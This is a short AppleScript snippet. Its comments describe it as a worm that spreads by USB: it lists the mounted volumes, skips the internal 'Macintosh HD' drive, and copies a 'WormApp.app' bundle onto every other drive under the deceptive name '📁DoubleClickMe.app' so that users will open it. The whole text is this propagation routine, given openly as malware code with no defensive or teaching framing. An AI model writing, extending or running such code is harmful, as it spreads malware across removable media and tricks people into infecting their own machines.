-- Get a list of mounted volumes (i.e., disks, including USB drives)
set drives to do shell script "ls /Volumes"

-- Loop through each mounted volume
repeat with d in paragraphs of drives
	if d is not "Macintosh HD" then -- Skip internal drive
		try
			-- Copy worm app to the USB drive with a deceptive name
			do shell script "cp -R /Users/Shared/WormApp.app /Volumes/" & d & "/📁DoubleClickMe.app"
		end try
	end if
end repeat
